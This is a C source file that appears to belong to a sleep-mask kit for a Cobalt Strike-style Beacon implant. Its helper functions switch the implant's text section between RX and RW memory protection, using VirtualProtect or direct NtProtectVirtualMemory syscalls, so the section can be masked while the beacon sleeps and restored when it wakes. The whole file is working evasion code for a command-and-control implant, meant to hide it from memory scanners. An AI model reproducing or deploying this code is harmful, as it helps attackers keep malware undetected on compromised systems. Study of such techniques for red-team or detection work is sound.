/*
    Helper functions to help mask the text section when beacon sleeps.
    The masking of the text section is based on the Malleable C2 profile
    setting stage.userwx.

    stage.userwx = true
       Beacon will mask the text section when it sleeps as the memory
       protection is set to RWX.

    stage.userwx = false
       Beacon will not mask the section as the memory protection is set
       to RX in this case.

       These functions will help with that, so beacon can modify the
       memory protection before sleeping to RW to mask the section and
       when it wakes back up will un-mask the section and set the
       protection back to RX.
*/

int initialized = 0;

PALLOCATED_MEMORY_SECTION get_text_section(PBEACON_INFO beacon_info) {
   int regionIndex = 0, sectionIndex = 0;
   PALLOCATED_MEMORY_SECTION pSection = NULL;

   for (regionIndex = 0; regionIndex < sizeof(beacon_info->allocatedMemory.AllocatedMemoryRegions) / sizeof(ALLOCATED_MEMORY_REGION); ++regionIndex) {
      /* only look for the beacon memory region */
      if (beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Purpose == PURPOSE_BEACON_MEMORY) {
         for (sectionIndex = 0; sectionIndex < sizeof(beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Sections) / sizeof(ALLOCATED_MEMORY_SECTION); ++sectionIndex) {
            /* Set a pointer to the section */
            pSection = &beacon_info->allocatedMemory.AllocatedMemoryRegions[regionIndex].Sections[sectionIndex];
            if (pSection->Label == LABEL_TEXT) {
               return pSection;
            }
         }
      }
   }

   return NULL;
}

void setup_text_section(PSLEEPMASK_INFO sleepMaskInfo) {
   PALLOCATED_MEMORY_SECTION pTextSection = NULL;

   // Only initialize once
   if (initialized) {
		return;
   }
   initialized = 1;

   pTextSection = get_text_section(&sleepMaskInfo->beacon_info);

	/* Check if the text section can be masked */
   if (pTextSection == NULL || pTextSection->BaseAddress == NULL || pTextSection->MaskSection == FALSE) {
      return;
   }

	/* Check to see if VirtualProtect will be needed. */
   if (pTextSection->CurrentProtect == PAGE_EXECUTE_READWRITE) {
      return;
   }

#if USE_SYSCALLS
	// Using a system call for VirtualProtect, additional setup required.
	#ifdef SYSCALLS_beacon
		if (!initializeSyscalls())
	#else
		if (!SW3_PopulateSyscallList())
	#endif
		{
			DLOGT("Failed to initialize syscalls, text section will not be masked");
			pTextSection->MaskSection = FALSE;
			return;
		}
#else
	// Using standard Windows API, no additional setup required.
#endif

}

void mask_text_section(PBEACON_INFO beacon_info) {
   PALLOCATED_MEMORY_SECTION pTextSection = get_text_section(beacon_info);

   if (pTextSection == NULL || pTextSection->BaseAddress == NULL || pTextSection->MaskSection == FALSE) {
      return;
   }

   /* Change protection if needed */
   DLOG("sleep_mask: mask_text_section protections %x %x\n", pTextSection->CurrentProtect, pTextSection->PreviousProtect);
   if (pTextSection->CurrentProtect == PAGE_EXECUTE_READ) {
      DWORD old;
#if USE_SYSCALLS
		SIZE_T size = pTextSection->VirtualSize;
		PVOID ptr = pTextSection->BaseAddress;

		if (0 != NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &ptr, &size, PAGE_READWRITE, &old)) {
			DLOGT("Failed to protect virtual memory, text section will not be masked");
			return;
		}
#else
      if (!VirtualProtect(pTextSection->BaseAddress, pTextSection->VirtualSize, PAGE_READWRITE, &old)) {
         DLOGT("Failed to protect virtual memory, text section will not be masked\n");
         return;
      }
#endif

      pTextSection->CurrentProtect = PAGE_READWRITE;
      pTextSection->PreviousProtect = old;
      DLOG("sleep_mask: mask_text_section updated protections %x %x\n", pTextSection->CurrentProtect, pTextSection->PreviousProtect);
   }

   /* Mask the text section */
   mask_section(beacon_info, pTextSection);
}

void unmask_text_section(PBEACON_INFO beacon_info) {
   PALLOCATED_MEMORY_SECTION pTextSection = get_text_section(beacon_info);

   if (pTextSection == NULL || pTextSection->BaseAddress == NULL || pTextSection->MaskSection == FALSE) {
      return;
   }

   /* Unmask the text section */
   mask_section(beacon_info, pTextSection);

   /* Change protection back if needed */
   DLOG("sleep_mask: unmask_text_section protections %x %x\n", pTextSection->CurrentProtect, pTextSection->PreviousProtect);
   if (pTextSection->CurrentProtect == PAGE_READWRITE) {
      DWORD old;
#if USE_SYSCALLS
		SIZE_T size = pTextSection->VirtualSize;
		PVOID ptr = pTextSection->BaseAddress;
		if (0 != NtProtectVirtualMemory(GetCurrentProcess(), (PVOID) &ptr, &size, pTextSection->PreviousProtect, &old)) {
         DLOGT("Failed to protect virtual memory, text section is not executable\n");
         return;
		}
#else
      if (!VirtualProtect(pTextSection->BaseAddress, pTextSection->VirtualSize, pTextSection->PreviousProtect, &old)) {
         DLOGT("Failed to protect virtual memory, text section is not executable\n");
         return;
      }
#endif

      pTextSection->CurrentProtect = pTextSection->PreviousProtect;
      pTextSection->PreviousProtect = old;
      DLOG("sleep_mask: unmask_text_section updated protections %x %x\n", pTextSection->CurrentProtect, pTextSection->PreviousProtect);
   }
}
